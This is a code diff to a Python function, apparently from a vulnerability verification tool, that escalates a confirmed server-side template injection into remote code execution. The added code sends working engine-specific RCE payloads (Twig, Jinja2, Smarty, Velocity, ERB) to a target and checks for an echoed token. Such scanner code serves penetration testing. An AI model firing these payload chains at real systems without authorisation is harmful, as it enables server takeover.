@@ -10758,16 +10758,84 @@ def verify_wordpress_ssti(
                     boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
                            f"Paso 5b: SSTI (navegador) — resultado {payload_expected} visible.",
                            f"Step 5b: SSTI (browser) — result {payload_expected} visible.")
+                # --- Post-SSTI RCE escalation via engine-specific payloads ---
+                try:
+                    _win_payload = res.evidence["payload_ganador"]
+                    # Detect template engine from winning payload syntax
+                    _ssti_engine = "unknown"
+                    if _win_payload.startswith("{{"):
+                        _ssti_engine = "twig_or_jinja2"
+                    elif _win_payload.startswith("${"):
+                        _ssti_engine = "smarty_velocity"
+                    elif _win_payload.startswith("<%="):
+                        _ssti_engine = "erb"
+                    elif _win_payload.startswith("#{"):
+                        _ssti_engine = "ruby"
+                    res.evidence["ssti_engine"] = _ssti_engine
+
+                    # Engine-specific RCE candidates (token-based confirm)
+                    _ssti_rce_token = _token()[:8]
+                    _rce_candidates = []
+                    if _ssti_engine == "twig_or_jinja2":
+                        # Twig: filter-chain RCE
+                        _rce_candidates = [
+                            (f"{{{{['{_ssti_rce_token}']|map('system')|join}}}}",
+                             _ssti_rce_token, "twig_map_system"),
+                            # Jinja2: subprocess via __subclasses__
+                            (f"{{{{'echo {_ssti_rce_token}'.__class__.__mro__[1]"
+                             f".__subclasses__()[396]('echo {_ssti_rce_token}',shell=True,"
+                             f"stdout=-1).communicate()[0].decode()}}}}",
+                             _ssti_rce_token, "jinja2_subclasses"),
+                            # Twig: _self chain
+                            (f"{{{{_self.env.registerUndefinedFilterCallback(\"system\")}}}}{{{{_self.env.getFilter('echo {_ssti_rce_token}')}}}}",
+                             _ssti_rce_token, "twig_self_env"),
+                        ]
+                    elif _ssti_engine == "smarty_velocity":
+                        _rce_candidates = [
+                            (f"{{php}}echo '{_ssti_rce_token}';{{/php}}", _ssti_rce_token, "smarty_php"),
+                            (f"$class.inspect('java.lang.Runtime').type.getRuntime().exec('echo {_ssti_rce_token}')",
+                             _ssti_rce_token, "velocity_runtime"),
+                        ]
+                    elif _ssti_engine == "erb":
+                        _rce_candidates = [
+                            (f"<%= `echo {_ssti_rce_token}` %>", _ssti_rce_token, "erb_backtick"),
+                            (f"<%= system('echo {_ssti_rce_token}') %>", _ssti_rce_token, "erb_system"),
+                        ]
+
+                    for _rce_p, _rce_confirm, _rce_tech in _rce_candidates:
+                        try:
+                            _rce_params = dict(base_params)
+                            _rce_params[ssti_param] = _rce_p
+                            _rce_resp = boot.sub_sess.request(
+                                m, boot.base_url + endpoint,
+                                data=_rce_params if m != "GET" else None,
+                                params=_rce_params if m == "GET" else None, timeout=15)
+                            if _rce_confirm in (_rce_resp.text or ""):
+                                res.evidence["ssti_rce"] = {
+                                    "technique": _rce_tech,
+                                    "payload": _rce_p[:200],
+                                    "token_confirmed": _rce_confirm,
+                                }
+                                step(f"SSTI RCE CONFIRMADO via {_rce_tech} — token {_rce_confirm!r} en respuesta")
+                                break
+                        except Exception:
+                            pass
+                except Exception:
+                    pass
                 break
         res.evidence["intentos"] = tried
         if found:
             res.verified = True
             res.ok = True
+            _rce_note = ""
+            if res.evidence.get("ssti_rce"):
+                _rce_note = (f" | RCE escalado via {res.evidence['ssti_rce']['technique']}")
             res.detail = (f"SSTI confirmada: la peticion con {ssti_param}="
                           f"{res.evidence['payload_ganador']!r} hizo que el motor de plantillas "
                           f"EVALUARA la expresion y devolviera {res.evidence['resultado_esperado_ganador']} "
                           f"en la respuesta -- prueba inequivoca de evaluacion de codigo en "
-                          f"servidor (ese numero no esta en ningun punto del payload enviado)")
+                          f"servidor (ese numero no esta en ningun punto del payload enviado)"
+                          f"{_rce_note}")
         else:
             res.ok = True
             res.detail = (f"se probaron {len(tried)} sintaxis de plantilla para {ssti_param} "
